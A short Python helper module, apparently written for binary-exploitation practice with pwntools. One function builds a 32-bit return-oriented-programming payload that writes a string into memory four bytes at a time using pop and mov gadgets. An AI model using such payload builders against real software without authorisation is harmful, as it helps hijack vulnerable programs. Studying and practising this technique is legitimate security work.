import re
from pwn import p32

def _recvall(io):
    """
    Prints final output of the program
    """

    d = io.recvall()
    print(d.decode("utf-8"))

def write_string_to_memory(start_addr, string_data, g_pop, g_mov):

    # Pads the string
    required = abs((len(string_data) % 4) - 4)
    string_data += " " * required

    if len(string_data) % 4 != 0: raise Exception("String length incorrect")

    # Split the string into sets of 4
    chunks = re.findall(r"....", string_data)

    # Writes data to memory
    payload = b""
    for c in chunks:
        payload += g_pop
        payload += p32(start_addr)
        payload += str.encode(c)
        payload += g_mov

        # Increment the address each time
        start_addr += 4

    return payload